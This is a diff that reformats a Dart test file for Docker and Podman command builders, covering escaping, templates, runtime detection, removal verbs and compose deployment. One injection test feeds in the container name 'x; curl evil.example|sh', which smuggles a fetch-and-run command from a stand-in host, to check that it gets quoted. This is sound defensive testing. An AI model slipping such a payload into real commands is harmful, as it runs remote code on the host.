@@ -13,32 +13,17 @@ void main() {
 
     test('shell variables are plain, with no stray backslash', () {
       // `\$ids` would make the shell look for a literal-dollar command, not the variable.
-      for (final cmd in [
-        dockerPsCommand,
-        dockerRestartsCommand,
-        dockerImagesCommand,
-      ]) {
-        expect(
-          cmd,
-          isNot(contains(r'\$')),
-          reason: r'a backslash-escaped $ is not shell syntax',
-        );
+      for (final cmd in [dockerPsCommand, dockerRestartsCommand, dockerImagesCommand]) {
+        expect(cmd, isNot(contains(r'\$')), reason: r'a backslash-escaped $ is not shell syntax');
       }
       expect(dockerRestartsCommand, contains(r'-n "$ids"'));
       expect(dockerPsCommand, contains(r'[ "$found" = 0 ]'));
     });
 
-    test(
-      'the format tabs are literal backslash-t for the runtime to interpret',
-      () {
-        expect(dockerPsCommand, contains(r'{{.ID}}\t{{.Names}}'));
-        expect(
-          dockerPsCommand,
-          isNot(contains('\t')),
-          reason: 'a real tab would break the template',
-        );
-      },
-    );
+    test('the format tabs are literal backslash-t for the runtime to interpret', () {
+      expect(dockerPsCommand, contains(r'{{.ID}}\t{{.Names}}'));
+      expect(dockerPsCommand, isNot(contains('\t')), reason: 'a real tab would break the template');
+    });
   });
 
   group('both runtimes are queried', () {
@@ -70,52 +55,27 @@ void main() {
     test('a runtime is only used when its ps actually answers', () {
       // A binary whose daemon or socket is unreachable would otherwise be selected and then fail
       // on every call.
-      expect(
-        dockerRuntimesCommand,
-        contains('docker ps >/dev/null 2>&1; then echo docker'),
-      );
-      expect(
-        dockerRuntimesCommand,
-        contains('podman ps >/dev/null 2>&1; then echo podman'),
-      );
+      expect(dockerRuntimesCommand, contains('docker ps >/dev/null 2>&1; then echo docker'));
+      expect(dockerRuntimesCommand, contains('podman ps >/dev/null 2>&1; then echo podman'));
     });
 
-    test(
-      'the compose label templates differ per runtime, as the engines require',
-      () {
-        // Docker has a `.Label "key"` method and a string `.Labels`; Podman has no `.Label` and a
-        // map `.Labels`. Using either syntax on the other engine errors out.
-        expect(
-          dockerPsCommand,
-          contains(r'{{.Label "com.docker.compose.project"}}'),
-        );
-        expect(
-          dockerPsCommand,
-          contains(r'{{index .Labels "com.docker.compose.project"}}'),
-        );
-      },
-    );
+    test('the compose label templates differ per runtime, as the engines require', () {
+      // Docker has a `.Label "key"` method and a string `.Labels`; Podman has no `.Label` and a
+      // map `.Labels`. Using either syntax on the other engine errors out.
+      expect(dockerPsCommand, contains(r'{{.Label "com.docker.compose.project"}}'));
+      expect(dockerPsCommand, contains(r'{{index .Labels "com.docker.compose.project"}}'));
+    });
 
     test('restart counts use each engine\'s own inspect field name', () {
       // Docker's template field is `.Id`; Podman's is `.ID`, and `.Id` errors there.
-      expect(
-        dockerRestartsCommand,
-        contains(r"'docker\t{{.Id}}\t{{.RestartCount}}'"),
-      );
-      expect(
-        dockerRestartsCommand,
-        contains(r"'podman\t{{.ID}}\t{{.RestartCount}}'"),
-      );
+      expect(dockerRestartsCommand, contains(r"'docker\t{{.Id}}\t{{.RestartCount}}'"));
+      expect(dockerRestartsCommand, contains(r"'podman\t{{.ID}}\t{{.RestartCount}}'"));
     });
   });
 
   group('actions quote their identifiers', () {
     test('a crafted container name cannot inject a command', () {
-      final cmd = dockerAction(
-        r'x; curl evil.example|sh',
-        'stop',
-        runtime: 'docker',
-      );
+      final cmd = dockerAction(r'x; curl evil.example|sh', 'stop', runtime: 'docker');
       expect(cmd, contains(r"'x; curl evil.example|sh'"));
       expect(cmd, startsWith('docker stop '));
     });
@@ -133,30 +93,15 @@ void main() {
     });
 
     test('remove maps to the right verb per resource', () {
-      expect(
-        dockerAction('c', 'remove', runtime: 'docker'),
-        contains('docker rm -f'),
-      );
-      expect(
-        dockerImageAction('i', 'remove', runtime: 'docker'),
-        contains('docker rmi -f'),
-      );
-      expect(
-        dockerVolumeAction('v', 'remove', runtime: 'docker'),
-        contains('docker volume rm -f'),
-      );
-      expect(
-        dockerNetworkAction('n', 'remove', runtime: 'docker'),
-        contains('docker network rm'),
-      );
+      expect(dockerAction('c', 'remove', runtime: 'docker'), contains('docker rm -f'));
+      expect(dockerImageAction('i', 'remove', runtime: 'docker'), contains('docker rmi -f'));
+      expect(dockerVolumeAction('v', 'remove', runtime: 'docker'), contains('docker volume rm -f'));
+      expect(dockerNetworkAction('n', 'remove', runtime: 'docker'), contains('docker network rm'));
     });
 
     test('lifecycle verbs pass through unchanged', () {
       for (final action in ['start', 'stop', 'restart', 'pause', 'unpause']) {
-        expect(
-          dockerAction('c', action, runtime: 'podman'),
-          startsWith('podman $action '),
-        );
+        expect(dockerAction('c', action, runtime: 'podman'), startsWith('podman $action '));
       }
     });
 
@@ -198,33 +143,27 @@ void main() {
       expect(command, contains('OMNITERM_NO_FILE'));
     });
 
-    test(
-      'deploy validates a staged file and restores the prior file on failure',
-      () {
-        final command = composeDeploy(
-          '/srv/demo/compose.yml',
-          'demo',
-          'services:\n  web:\n    image: nginx\n',
-          workingDir: '/srv/demo',
-          configFiles: '/srv/demo/compose.yml,/srv/demo/override.yml',
-          runtime: 'docker',
-        );
+    test('deploy validates a staged file and restores the prior file on failure', () {
+      final command = composeDeploy(
+        '/srv/demo/compose.yml',
+        'demo',
+        'services:\n  web:\n    image: nginx\n',
+        workingDir: '/srv/demo',
+        configFiles: '/srv/demo/compose.yml,/srv/demo/override.yml',
+        runtime: 'docker',
+      );
 
-        expect(command, contains(r'config >/dev/null'));
-        expect(command, contains('VALIDATION FAILED — stack unchanged'));
-        expect(
-          command,
-          contains('DEPLOY FAILED — restoring previous compose file'),
-        );
-        expect(command, contains("-f '/srv/demo/override.yml'"));
-        expect(command, contains('OMNITERM_DEPLOY_OK'));
-        expect(
-          command,
-          isNot(contains('services:\n')),
-          reason: 'YAML must travel as base64, never raw shell text',
-        );
-      },
-    );
+      expect(command, contains(r'config >/dev/null'));
+      expect(command, contains('VALIDATION FAILED — stack unchanged'));
+      expect(command, contains('DEPLOY FAILED — restoring previous compose file'));
+      expect(command, contains("-f '/srv/demo/override.yml'"));
+      expect(command, contains('OMNITERM_DEPLOY_OK'));
+      expect(
+        command,
+        isNot(contains('services:\n')),
+        reason: 'YAML must travel as base64, never raw shell text',
+      );
+    });
   });
 
   group('compose actions', () {
